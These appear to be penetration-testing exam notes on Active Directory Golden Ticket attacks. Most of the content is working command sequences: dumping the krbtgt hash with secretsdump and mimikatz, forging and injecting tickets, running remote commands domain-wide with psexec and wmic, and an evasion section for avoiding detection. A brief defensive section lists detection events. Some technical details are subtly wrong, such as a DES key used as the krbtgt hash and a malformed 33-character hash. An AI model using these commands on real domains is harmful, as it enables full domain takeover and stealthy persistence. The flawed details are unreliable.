# Golden Ticket Attacks

## 🎯 Overview

**Golden Ticket attacks** represent the **ultimate domain persistence mechanism** in Active Directory environments. When you compromise the **krbtgt account**, you literally **own the domain**.

> **"When we compromise the krbtgt account, we own the domain"** 👑
> 
> **"We can request access to any resource or system on the domain"**
> 
> **"Golden tickets == complete access to every machine"**

## 🎫 What is a Golden Ticket?

A **Golden Ticket** is a **forged Kerberos Ticket Granting Ticket (TGT)** that provides:
- **Unlimited domain access** - Access to any resource in the domain
- **Persistent access** - Tickets valid for 10 years by default
- **Stealth operation** - Bypasses normal authentication logging
- **Complete domain control** - Administrative access to all systems

### The krbtgt Account
- **Key Distribution Center (KDC) service account**
- **Signs all Kerberos tickets** in the domain
- **Compromise = complete domain control**
- **Password rarely changed** (often never!)

## 🔓 Prerequisites for Golden Ticket Creation

### Required Information
1. **krbtgt NTLM hash** - Obtained from NTDS.dit or DCSync
2. **Domain SID** - Security Identifier of the domain
3. **Domain name** - FQDN of the target domain
4. **Target username** - Any valid or invalid username

### Common Acquisition Methods
```bash
# Method 1: NTDS.dit extraction
secretsdump.py domain/admin@dc.target.local -just-dc-ntlm
# Look for: krbtgt:502:aad3b435b51404eeaad3b435b51404ee:HASH_HERE

# Method 2: DCSync attack
mimikatz.exe "lsadump::dcsync /domain:target.local /user:krbtgt"

# Method 3: Direct LSASS dump (if on DC)
mimikatz.exe "privilege::debug" "lsadump::lsa /inject /name:krbtgt"
```

## 🎭 Golden Ticket Creation Process

### Step 1: Gather Required Information
```bash
# From NTDS.dit extraction or DCSync - Real MARVEL Domain Example
Domain: MARVEL.local
Domain SID: S-1-5-21-301214212-3920777931-1277971883
krbtgt hash: 26b5da5eecb54cc1

# Alternative extraction methods
mimikatz.exe "lsadump::dcsync /domain:MARVEL.local /user:krbtgt"
# Output shows:
# * Kerberos
#   Default Salt : MARVEL.LOCALkrbtgt
#   Credentials
#     des_cbc_md5    : 26b5da5eecb54cc1
```

### Step 2: Create Golden Ticket with Mimikatz
```bash
# Real MARVEL Domain Golden Ticket Creation (from screenshot)
mimikatz.exe "kerberos::golden /user:Administrator /domain:marvel.local /sid:S-1-5-21-301214212-3920777931-1277971883 /krbtgt:26b5da5eecb54cc1 /ticket:golden.kirbi"

# Advanced options with multiple groups
mimikatz.exe "kerberos::golden /user:Administrator /domain:MARVEL.local /sid:S-1-5-21-301214212-3920777931-1277971883 /krbtgt:26b5da5eecb54cc1 /groups:512,513,518,519,520 /ticket:golden.kirbi /ptt"

# The command structure shown in screenshot:
# mimikatz # kerberos::golden /User:Administrator /domain:marvel.local /sid:S-1-5-21-301214212-3920777931-1277971883 /krbtgt:26b5da5eecb54cc1
```

### Step 3: Use Golden Ticket
```bash
# Load ticket into memory
mimikatz.exe "kerberos::ptt golden.kirbi"

# Verify ticket is loaded
klist

# Test access to domain controller
dir \\dc.marvel.local\c$
```

## 🚀 Practical Golden Ticket Usage

### Remote Access Examples
```bash
# Access Domain Controller
psexec.exe \\dc.marvel.local cmd

# Access any domain system
psexec.exe \\workstation.marvel.local cmd

# Mount remote shares
net use Z: \\fileserver.marvel.local\share

# Execute commands remotely
wmic /node:target.marvel.local process call create "cmd.exe"
```

### PowerShell Integration
```powershell
# Create Golden Ticket with PowerShell
Import-Module .\Invoke-Mimikatz.ps1
Invoke-Mimikatz -Command '"kerberos::golden /user:admin /domain:marvel.local /sid:S-1-5-21-2894840767-2101617394-1820205593 /krbtgt:9b25135001a69d53af33aa6cdc8915735 /ptt"'

# Test access
Test-NetConnection dc.marvel.local -Port 445
Get-WmiObject -Class Win32_ComputerSystem -ComputerName dc.marvel.local
```

## 🔍 Advanced Golden Ticket Techniques

### Custom Group Memberships
```bash
# Include specific group RIDs for enhanced access
# 512 = Domain Admins
# 513 = Domain Users  
# 518 = Schema Admins
# 519 = Enterprise Admins
# 520 = Group Policy Creator Owners

mimikatz.exe "kerberos::golden /user:admin /domain:target.local /sid:DOMAIN_SID /krbtgt:KRBTGT_HASH /groups:512,518,519 /ticket:golden.kirbi"
```

### Extended Validity Period
```bash
# Create ticket valid for specific timeframe
mimikatz.exe "kerberos::golden /user:admin /domain:target.local /sid:DOMAIN_SID /krbtgt:KRBTGT_HASH /startoffset:0 /endin:600 /renewmax:10080 /ticket:golden.kirbi"
```

### Cross-Domain Golden Tickets
```bash
# For forest-wide access (requires Enterprise Admin)
mimikatz.exe "kerberos::golden /user:admin /domain:child.target.local /sid:CHILD_DOMAIN_SID /krbtgt:KRBTGT_HASH /sids:S-1-5-21-ROOT-DOMAIN-SID-519 /ticket:golden.kirbi"
```

## 🎯 PJPT Exam Strategy

### Time Allocation (10-15 minutes)
1. **5 minutes**: Extract krbtgt hash and domain information
2. **5 minutes**: Create and test Golden Ticket
3. **5 minutes**: Document persistent access and impact

### Quick Commands for Exam
```bash
# Extract krbtgt info
secretsdump.py domain/user:pass@dc_ip -just-dc-ntlm | grep krbtgt

# Get domain SID
wmic computersystem get domain
whoami /user | findstr "S-1-5-21"

# Create Golden Ticket
mimikatz.exe "kerberos::golden /user:admin /domain:TARGET.LOCAL /sid:DOMAIN_SID /krbtgt:KRBTGT_HASH /ptt"

# Test access
dir \\dc.target.local\c$
```

### Documentation Requirements
1. **Screenshot krbtgt hash extraction** - Shows domain compromise capability
2. **Golden Ticket creation output** - Proves persistence mechanism
3. **Access demonstration** - Show administrative access to multiple systems
4. **Impact assessment** - Explain the significance of unlimited domain access

## ⚠️ Detection and Evasion

### Common Detection Methods
- **Unusual ticket lifetimes** - Golden tickets often have extended validity
- **Non-existent users** - Tickets for accounts that don't exist
- **Privilege escalation patterns** - Sudden administrative access
- **Event log analysis** - Missing authentication events

### Evasion Techniques
```bash
# Use realistic usernames
mimikatz.exe "kerberos::golden /user:administrator /domain:target.local ..."

# Limit ticket lifetime
mimikatz.exe "kerberos::golden ... /endin:480 ..."  # 8 hours

# Include realistic groups only
mimikatz.exe "kerberos::golden ... /groups:512 ..."  # Domain Admins only
```

## 🛡️ Defensive Considerations

### Prevention Strategies
- **Regular krbtgt password changes** - Invalidates existing Golden Tickets
- **Privileged account monitoring** - Alert on suspicious administrative activity
- **Kerberos logging enhancement** - Enable detailed authentication logging
- **Network segmentation** - Limit lateral movement capabilities

### Detection Indicators
- **Event ID 4769** - Kerberos service ticket requests with unusual patterns
- **Event ID 4624** - Logon events without corresponding authentication
- **Unusual service access** - Administrative access to multiple systems
- **Extended ticket lifetimes** - Tickets valid longer than domain policy

## 🔗 Integration with Attack Chain

### Typical Attack Progression
1. **Initial Access** → **Privilege Escalation** → **Domain Admin**
2. **NTDS.dit Extraction** → **krbtgt Hash Extraction**
3. **Golden Ticket Creation** → **Persistent Access**
4. **Lateral Movement** → **Data Exfiltration** → **Impact Assessment**

### Tool Integration
- **Secretsdump/Mimikatz** for krbtgt hash extraction
- **Mimikatz** for Golden Ticket creation and usage
- **PsExec/WMIExec** for remote command execution
- **CrackMapExec** for lateral movement validation
- **BloodHound** for target prioritization

## 📊 Business Impact Assessment

### What Golden Tickets Enable
- **Complete administrative access** to all domain systems
- **Persistent access** that survives password changes
- **Stealth operations** that bypass normal logging
- **Data access** to any file, database, or application
- **Service disruption** capability across the entire domain

### Quantifying the Impact
```bash
# Demonstrate scope of access
crackmapexec smb domain_range -k --use-kcache

# Show critical system access
psexec.exe \\dc.target.local "dir C:\Windows\NTDS"
psexec.exe \\exchange.target.local "Get-Mailbox"
psexec.exe \\sql.target.local "sqlcmd -Q 'SELECT name FROM sys.databases'"
```

## 🏆 Success Metrics

A successful Golden Ticket attack demonstrates:
- ✅ **krbtgt hash extraction** - Shows domain compromise capability
- ✅ **Golden Ticket creation** - Proves persistent access mechanism
- ✅ **Multi-system access** - Administrative control across domain
- ✅ **Stealth operation** - Minimal detection footprint
- ✅ **Business impact** - Clear demonstration of compromise consequences

---

## 📝 Final Notes

**Golden Ticket attacks represent the pinnacle of Active Directory persistence.** They provide:
- **Unlimited domain access** with administrative privileges
- **Long-term persistence** that survives most remediation efforts
- **Stealth capabilities** that evade standard monitoring
- **Maximum business impact** through complete domain control

**PJPT Success Tip**: Golden Tickets are not just about persistence - they're about demonstrating **complete domain compromise** and the **business-critical nature** of the security failure. Use them to show the client that their entire domain infrastructure is under attacker control! 👑

**Remember**: With great power comes great responsibility. Golden Tickets provide complete domain access - use this capability to demonstrate impact while maintaining professional boundaries and avoiding business disruption. 